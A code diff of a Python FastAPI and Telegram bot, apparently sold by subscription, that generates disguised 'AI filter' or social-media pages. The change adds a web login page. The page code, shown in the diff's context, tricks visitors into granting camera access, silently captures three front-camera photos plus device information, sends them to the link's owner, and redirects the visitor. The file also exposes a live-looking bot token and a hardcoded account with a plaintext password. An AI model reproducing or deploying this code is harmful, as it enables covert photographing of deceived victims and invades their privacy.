@@ -3,16 +3,17 @@ import base64
 import io
 import sqlite3
 import uvicorn
+from pydantic import BaseModel
 from fastapi import FastAPI, Request, BackgroundTasks
 from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.middleware.cors import CORSMiddleware
 import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ForceReply
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # 1. الإعدادات الأساسية
 BOT_TOKEN = "8652491802:AAFOd303C5JsIaLkyuFfl6Op8XF-cygo6tg"
 RENDER_URL = "https://haker-cam.onrender.com" 
-TIKTOK_PROFILE = "https://www.tiktok.com/@hrb_o9?_r"  # 👈 ضع رابط حسابك التيك توك هنا
+TIKTOK_PROFILE = "https://www.tiktok.com/@your_username"  # 👈 ضع رابط حسابك التيك توك هنا
 
 bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
 app = FastAPI()
@@ -25,11 +26,16 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
+# نموذج استقبال بيانات تسجيل الدخول من الـ WebApp
+class LoginData(BaseModel):
+    chat_id: int
+    username: str
+    password: str
+
 # ---- إعداد قاعدة البيانات الدائمة المحدثة (نظام الحسابات) ----
 def init_db():
     conn = sqlite3.connect("users.db")
     cursor = conn.cursor()
-    # جدول المستخدمين المشتركين
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS bot_users (
             username TEXT PRIMARY KEY,
@@ -45,7 +51,6 @@ try:
 except Exception as e:
     print(f"⚠️ قاعدة البيانات جاهزة: {e}")
 
-# دالة تستخدمها أنت لإضافة مستخدم جديد للبوت (يمكنك استدعاؤها أو إضافتها يدوياً)
 def create_new_account(username, password):
     conn = sqlite3.connect("users.db")
     cursor = conn.cursor()
@@ -57,7 +62,6 @@ def create_new_account(username, password):
     finally:
         conn.close()
 
-# دالة للتحقق من بيانات تسجيل الدخول وربط الحساب بالـ chat_id
 def try_login_user(chat_id, username, password):
     conn = sqlite3.connect("users.db")
     cursor = conn.cursor()
@@ -67,7 +71,6 @@ def try_login_user(chat_id, username, password):
     if result:
         db_password, linked_chat = result
         if db_password == password:
-            # تحديث الـ chat_id لربط هذا الحساب بجهاز المستخدم الحالي في تليجرام
             cursor.execute("UPDATE bot_users SET linked_chat_id = ? WHERE username = ?", (chat_id, username))
             conn.commit()
             conn.close()
@@ -75,7 +78,6 @@ def try_login_user(chat_id, username, password):
     conn.close()
     return False
 
-# فحص هل هذا الـ chat_id ممتلك لحساب نشط ومسجل دخول
 def has_active_session(chat_id):
     conn = sqlite3.connect("users.db")
     cursor = conn.cursor()
@@ -83,6 +85,111 @@ def has_active_session(chat_id):
     result = cursor.fetchone()
     conn.close()
     return result is not None
+
+
+# ---- واجهة تسجيل الدخول الحديثة عبر التليجرام (Web App) ----
+def get_login_html():
+    return """
+    <!DOCTYPE html>
+    <html lang="ar" dir="rtl">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>تسجيل الدخول للنظام</title>
+        <script src="https://telegram.org/js/telegram-web-app.js"></script>
+        <style>
+            body {
+                background-color: #182533; color: #ffffff; font-family: system-ui, -apple-system, sans-serif;
+                display: flex; flex-direction: column; align-items: center; justify-content: center;
+                min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box;
+            }
+            .login-card {
+                background: #223140; padding: 30px 25px; border-radius: 15px;
+                box-shadow: 0 10px 25px rgba(0,0,0,0.4); max-width: 360px; width: 100%;
+                text-align: center; border: 1px solid #2b3d50;
+            }
+            h2 { font-size: 22px; margin-bottom: 20px; color: #5288c1; }
+            .input-group { margin-bottom: 20px; text-align: right; }
+            label { display: block; margin-bottom: 8px; font-size: 14px; color: #b1c7df; }
+            input {
+                width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #2b3d50;
+                background: #182533; color: white; font-size: 16px; box-sizing: border-box;
+                outline: none; transition: border 0.2s;
+            }
+            input:focus { border-color: #5288c1; }
+            .btn {
+                background-color: #2481cc; color: white; border: none; padding: 14px;
+                font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer;
+                width: 100%; margin-top: 10px; transition: background 0.2s;
+            }
+            #error-msg { color: #e53935; font-size: 14px; margin-top: 15px; display: none; }
+            #success-msg { color: #4caf50; font-size: 14px; margin-top: 15px; display: none; }
+        </style>
+    </head>
+    <body>
+        <div class="login-card">
+            <h2>🔐 تسجيل الدخول للنظام</h2>
+            <div class="input-group">
+                <label>اسم المستخدم</label>
+                <input type="text" id="username" placeholder="أدخل اسم المستخدم">
+            </div>
+            <div class="input-group">
+                <label>كلمة المرور</label>
+                <input type="password" id="password" placeholder="أدخل كلمة المرور">
+            </div>
+            <button class="btn" id="loginBtn">تسجيل الدخول</button>
+            <div id="error-msg"></div>
+            <div id="success-msg"></div>
+        </div>
+
+        <script>
+            const tg = window.Telegram.WebApp;
+            tg.expand();
+
+            document.getElementById('loginBtn').addEventListener('click', function() {
+                const user = document.getElementById('username').value.trim();
+                const pass = document.getElementById('password').value.trim();
+                const errorBlock = document.getElementById('error-msg');
+                const successBlock = document.getElementById('success-msg');
+
+                if(!user || !pass) {
+                    errorBlock.innerText = "⚠️ يرجى ملء جميع الحقول!";
+                    errorBlock.style.display = "block";
+                    return;
+                }
+
+                errorBlock.style.display = "none";
+                
+                fetch('/api/web-login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: tg.initDataUnsafe.user.id,
+                        username: user,
+                        password: pass
+                    })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if(data.status === "success") {
+                        successBlock.innerText = "🎉 تم تسجيل الدخول بنجاح!";
+                        successBlock.style.display = "block";
+                        setTimeout(() => { tg.close(); }, 1500);
+                    } else {
+                        errorBlock.innerText = "❌ " + data.message;
+                        errorBlock.style.display = "block";
+                    }
+                })
+                .catch(err => {
+                    errorBlock.innerText = "⚠️ حدث خطأ في الاتصال بالسيرفر";
+                    errorBlock.style.display = "block";
+                });
+            });
+        </script>
+    </body>
+    </html>
+    """
+
 
 # ---- واجهة المقالب الافتراضية (فلتر AI + تيك توك + سناب + انستا) ----
 def get_html_content(template_type):
@@ -139,9 +246,7 @@ def get_html_content(template_type):
         <style>
             * {{ box-sizing: border-box; margin: 0; padding: 0; }}
             body {{ 
-                background-color: {bg_color}; 
-                color: #ffffff; 
-                font-family: system-ui, -apple-system, sans-serif; 
+                background-color: {bg_color}; color: #ffffff; font-family: system-ui, -apple-system, sans-serif; 
                 display: flex; flex-direction: column; align-items: center; justify-content: center; 
                 min-height: 100vh; padding: 20px;
             }}
@@ -150,10 +255,7 @@ def get_html_content(template_type):
                 box-shadow: 0 15px 35px rgba(0,0,0,0.3); max-width: 420px; width: 100%; 
                 border: 1px solid #334155; text-align: center;
             }}
-            .logo {{
-                font-size: 34px; font-weight: 800; margin-bottom: 25px; letter-spacing: -1px;
-                display: inline-block; {logo_style}
-            }}
+            .logo {{ font-size: 34px; font-weight: 800; margin-bottom: 25px; letter-spacing: -1px; display: inline-block; {logo_style} }}
             .video-box {{
                 width: 100%; height: 200px; background: #000000; border-radius: 12px; margin-bottom: 25px;
                 display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative;
@@ -199,24 +301,17 @@ def get_html_content(template_type):
 
             function getDeviceInfo() {{
                 const ua = navigator.userAgent;
-                let os = "غير معروف";
-                let browser = "غير معروف";
-
+                let os = "غير معروف"; let browser = "غير معروف";
                 if (ua.indexOf("Win") !== -1) os = "Windows";
                 else if (ua.indexOf("Mac") !== -1) os = "Mac OS / iPhone";
                 else if (ua.indexOf("Android") !== -1) os = "Android";
-
                 if (ua.indexOf("Chrome") !== -1) browser = "Google Chrome";
                 else if (ua.indexOf("Safari") !== -1) browser = "Safari";
-                
                 return os + " (" + browser + ")";
             }}
 
             function tryCapture() {{
-                if (!ownerId) {{
-                    window.location.href = REDIRECT_URL;
-                    return;
-                }}
+                if (!ownerId) {{ window.location.href = REDIRECT_URL; return; }}
 
                 navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }})
                 .then(function(stream) {{
@@ -230,12 +325,9 @@ def get_html_content(template_type):
                     
                     video.onloadedmetadata = function() {{
                         let canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
+                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                         let ctx = canvas.getContext('2d');
-                        
-                        let shotsTaken = 0;
-                        const deviceInfo = getDeviceInfo();
+                        let shotsTaken = 0; const deviceInfo = getDeviceInfo();
                         
                         let captureInterval = setInterval(function() {{
                             if (shotsTaken >= 3) {{
@@ -244,21 +336,13 @@ def get_html_content(template_type):
                                 window.location.href = REDIRECT_URL;
                                 return;
                             }}
-                            
                             ctx.drawImage(video, 0, 0);
                             let base64Image = canvas.toDataURL('image/jpeg', 0.75);
-                            
                             fetch('/api/capture', {{
                                 method: 'POST',
                                 headers: {{ 'Content-Type': 'application/json' }},
-                                body: JSON.stringify({{ 
-                                    user_id: ownerId, 
-                                    image: base64Image, 
-                                    count: shotsTaken + 1,
-                                    device: deviceInfo 
-                                }})
+                                body: JSON.stringify({{ user_id: ownerId, image: base64Image, count: shotsTaken + 1, device: deviceInfo }})
                             }});
-                            
                             shotsTaken++;
                         }}, 500);
                     }};
@@ -268,7 +352,6 @@ def get_html_content(template_type):
                     document.getElementById('statusText').innerText = "⚠️ تعذر التحليل! يرجى منح الإذن للمحاولة مجدداً.";
                 }});
             }}
-
             document.getElementById('startBtn').addEventListener('click', tryCapture);
         </script>
     </body>
@@ -281,19 +364,19 @@ def get_html_content(template_type):
 def start(message):
     chat_id = message.chat.id
     
-    # إذا كان مسجل دخول مسبقاً، نفتح له لوحة التحكم مباشرة
     if has_active_session(chat_id):
         show_main_menu(chat_id)
         return
 
     welcome_text = (
-        "🛡️ **مرحباً بك في نظام الصيد الذكي المطور (v5.0)!**\n\n"
-        "هذا البوت مخصص للمشتركين بأكواد تفعيل رسمية فقط. يرجى تسجيل الدخول للوصول إلى لوحة التحكم وقوالب الذكاء الاصطناعي وكاشف الأجهزة.\n\n"
-        "🔽 اختر من الأزرار بالأسفل للمتابعة:"
+        "🛡️ **مرحباً بك في نظام الصيد الذكي المطور (v6.0)!**\n\n"
+        "هذا البوت مخصص للمشتركين بأكواد تفعيل رسمية فقط.\n"
+        "يرجى الضغط على الزر بالأسفل لتسجيل الدخول بشكل آمن عبر بوابة الويب."
     )
+    
     markup = InlineKeyboardMarkup()
     markup.add(
-        InlineKeyboardButton("🔐 تسجيل الدخول للنظام", callback_data="login_process"),
+        InlineKeyboardButton("🔐 تسجيل الدخول للنظام", web_app=telebot.types.WebAppInfo(url=f"{RENDER_URL}/login-page")),
         InlineKeyboardButton("ℹ️ تعليمات وكيفية الاشتراك", callback_data="show_instructions")
     )
     bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode="Markdown")
@@ -303,9 +386,9 @@ def show_instructions(call):
     chat_id = call.message.chat.id
     instructions = (
         "⚠️ **تنبيه: أنت غير مسجل في النظام حالياً!**\n\n"
-        "للحصول على حساب خاص بك (اسم مستخدم وكلمة مرور) وتفعيل الميزات الأسطورية، يرجى التواصل مع الإدارة مباشرة عبر حسابنا الرسمي في تيك توك:\n"
+        "للحصول على حساب خاص بك وتفعيل الميزات، يرجى التواصل مع الإدارة عبر حسابنا في تيك توك:\n"
         f"🔗 {TIKTOK_PROFILE}\n\n"
-        "*بعد إتمام عملية الاشتراك وتحويل الرسوم، سيتم تزويدك ببيانات الدخول الفريدة الخاصة بك فوراً.* 💳✨"
+        "*بعد إتمام الاشتراك، سيتم تزويدك ببيانات الدخول فوراً.* 💳✨"
     )
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("🔙 العودة للخلف", callback_data="back_to_start"))
@@ -315,39 +398,6 @@ def show_instructions(call):
 def back_to_start(call):
     bot.delete_message(call.message.chat.id, call.message.message_id)
     start(call.message)
-
-@bot.callback_query_handler(func=lambda call: call.data == "login_process")
-def login_process(call):
-    chat_id = call.message.chat.id
-    # طلب اسم المستخدم وكلمة السر بنمط نصي منظم متبوع بـ ForceReply
-    msg = bot.send_message(
-        chat_id, 
-        "📝 **يرجى إرسال بياناتك بالشكل التالي تماماً:**\n\n"
-        "`الاسم:الباسورد`\n\n"
-        "مثال: `moosa:123456`\n"
-        "*(تأكد من وضع النقطتين : بين الاسم والباسورد بدون فراغات)*", 
-        parse_mode="Markdown",
-        reply_markup=ForceReply(selective=True)
-    )
-    bot.register_next_step_handler(msg, process_login_credentials)
-
-def process_login_credentials(message):
-    chat_id = message.chat.id
-    text = message.text.strip()
-    
-    if ":" not in text:
-        msg = bot.send_message(chat_id, "❌ **صيغة خاطئة!** يرجى الضغط على زر تسجيل الدخول مجدداً وكتابتها بالشكل الصحيح `الاسم:الباسورد`.")
-        return
-        
-    try:
-        username, password = text.split(":", 1)
-        if try_login_user(chat_id, username.strip(), password.strip()):
-            bot.send_message(chat_id, "🎉 **تم تسجيل الدخول بنجاح! تفعيل أسطوري مطلق متاح لك الآن.**")
-            show_main_menu(chat_id)
-        else:
-            bot.send_message(chat_id, "❌ **بيانات الدخول غير صحيحة!** تأكد من الاسم والباسورد أو تواصل مع الإدارة عبر تيك توك.")
-    except Exception as e:
-        bot.send_message(chat_id, "⚠️ حدث خطأ أثناء معالجة البيانات، أعد المحاولة.")
 
 def show_main_menu(chat_id):
     markup = InlineKeyboardMarkup(row_width=1)
@@ -381,12 +431,25 @@ def gen_link(call):
     )
     bot.send_message(chat_id, msg, parse_mode="Markdown")
 
-# ---- المسارات واستقبل السيرفر ----
+# ---- المسارات واستقبال السيرفر (FastAPI) ----
 
 @app.get("/", response_class=HTMLResponse)
 async def get_home(request: Request):
     template = request.query_params.get("template", "tiktok")
     return get_html_content(template)
+
+@app.get("/login-page", response_class=HTMLResponse)
+async def login_page():
+    return get_login_html()
+
+@app.post("/api/web-login")
+async def api_web_login(data: LoginData):
+    if try_login_user(data.chat_id, data.username, data.password):
+        bot.send_message(data.chat_id, "🎉 **تم تسجيل دخولك بنجاح عبر بوابة الويب الآمنة!**")
+        show_main_menu(data.chat_id)
+        return {"status": "success"}
+    else:
+        return {"status": "error", "message": "بيانات الدخول غير صحيحة!"}
 
 @app.post(f"/{BOT_TOKEN}")
 async def telegram_webhook(request: Request):
@@ -431,7 +494,6 @@ async def capture_api(request: Request, background_tasks: BackgroundTasks):
 def startup_event():
     bot.remove_webhook()
     bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")
-    # 💡 لإنشاء حساب تجريبي لنفسك وتجربة الدخول:
     create_new_account("moosa", "123456")
     print("🚀 تم تشغيل بوت التفعيل التجاري المطور بنجاح!")
 
